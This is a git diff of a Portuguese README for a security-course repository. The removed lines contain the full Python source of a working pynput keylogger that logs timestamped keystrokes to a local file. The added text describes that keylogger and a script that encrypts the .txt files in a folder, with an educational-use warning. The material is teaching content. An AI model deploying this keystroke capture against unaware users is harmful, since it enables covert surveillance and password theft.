@@ -1,71 +1,66 @@
 # Criptografia-keylogger
 Repositório criado para realização das aulas de segurança da DIO/Santander
 
-# Python Keylogger Demo
+# 🐍 Projetos de Segurança em Python
 
-Este projeto demonstra como usar a biblioteca **pynput** em Python para capturar teclas pressionadas e salvar em um arquivo de log.
+Este repositório reúne dois projetos didáticos desenvolvidos em Python:  
+1. **Keylogger Demo** – captura teclas pressionadas e registra em arquivo de log.  
+2. **Criptografia de Arquivos** – criptografa e descriptografa arquivos `.txt` usando a biblioteca `cryptography`.
 
-## 🚀 Funcionalidades
+⚠️ **Aviso importante:** Estes projetos são apenas para fins educacionais. Não devem ser utilizados para monitorar terceiros ou criptografar dados sem consentimento.
+
+---
+
+## 🔑 Projeto 1: Keylogger Demo
+
+### 🚀 Funcionalidades
 - Captura teclas normais (letras, números, símbolos).
 - Identifica teclas especiais (Enter, Esc, Tab, etc).
 - Ignora teclas como Shift, Ctrl, Alt.
 - Registra data e hora de cada tecla pressionada.
 - Encerra automaticamente ao pressionar **ESC**.
 
-## 📂 Estrutura
-- `keylogger.py`: código principal.
-- `requirements.txt`: dependências do projeto.
-
-## ▶️ Como executar
-1. Clone este repositório:
+### ▶️ Como executar
+1. Instale as dependências:
    ```bash
-git clone *github.com/joaoalmeidarar/Criptografia-keylogger
+   pip install pynput
 
-Código do Keyloger
+- Execute o script:
+python keylogger.py
+- As teclas serão registradas em log.txt.
+🔐 Projeto 2: Criptografia de Arquivos🚀 Funcionalidades- Gera uma chave única de criptografia (chave.key).
 
-from pynput import keyboard
-from datetime import datetime
+- Criptografa arquivos .txt em uma pasta especificada.
+- Descriptografa os arquivos usando a mesma chave.
+- Exemplo prático de uso da biblioteca cryptography.
+  
+▶️ Como executar- Instale as dependências:
+pip install cryptography
+- Crie um arquivo de teste em uma pasta, por exemplo:
+test_files/teste.txt
+- Rode o script de criptografia:
+python criptografar.py
+- → O arquivo será criptografado.
+- Rode o script de descriptografia:
+python descriptografar.py
+- → O arquivo será restaurado ao conteúdo original.
 
-# Teclas que serão ignoradas no log
-IGNORAR = {
-    keyboard.Key.shift,
-    keyboard.Key.shift_r,
-    keyboard.Key.ctrl_l,
-    keyboard.Key.ctrl_r,
-    keyboard.Key.alt_l,
-    keyboard.Key.alt_r,
-    keyboard.Key.caps_lock,
-    keyboard.Key.cmd
-}
+📂 Estrutura do repositório
+python-security-projects/
+│
+├── keylogger.py          # Script de captura de teclas
+├── criptografar.py       # Script de criptografia
+├── descriptografar.py    # Script de descriptografia
+├── requirements.txt      # Dependências
+└── README.md             # Documentação
 
-# Função para registrar a tecla pressionada
-def on_press(key):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    try:
-        # Teclas normais (letras, números, símbolos)
-        with open("log.txt", "a", encoding="utf-8") as f:
-            f.write(f"{timestamp} - {key.char}\n")
-    except AttributeError:
-        # Teclas especiais
-        with open("log.txt", "a", encoding="utf-8") as f:
-            if key in IGNORAR:
-                return
-            elif key == keyboard.Key.space:
-                f.write(f"{timestamp} - [SPACE]\n")
-            elif key == keyboard.Key.enter:
-                f.write(f"{timestamp} - [ENTER]\n")
-            elif key == keyboard.Key.tab:
-                f.write(f"{timestamp} - [TAB]\n")
-            elif key == keyboard.Key.backspace:
-                f.write(f"{timestamp} - [BACKSPACE]\n")
-            elif key == keyboard.Key.esc:
-                f.write(f"{timestamp} - [ESC]\n")
-            else:
-                f.write(f"{timestamp} - [{key.name.upper()}]\n")
+📦 requirements.txt
+pynput
+cryptography
 
-# Inicia o listener
-print("🔍 Capturando teclas... Pressione ESC para encerrar.")
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
 
-    
+📚 Aprendizados
+- Uso da biblioteca pynput para interação com teclado.
+- Uso da biblioteca cryptography para criptografia simétrica.
+- Boas práticas de manipulação de arquivos em Python.
+- Estruturação de projetos e documentação no GitHub.
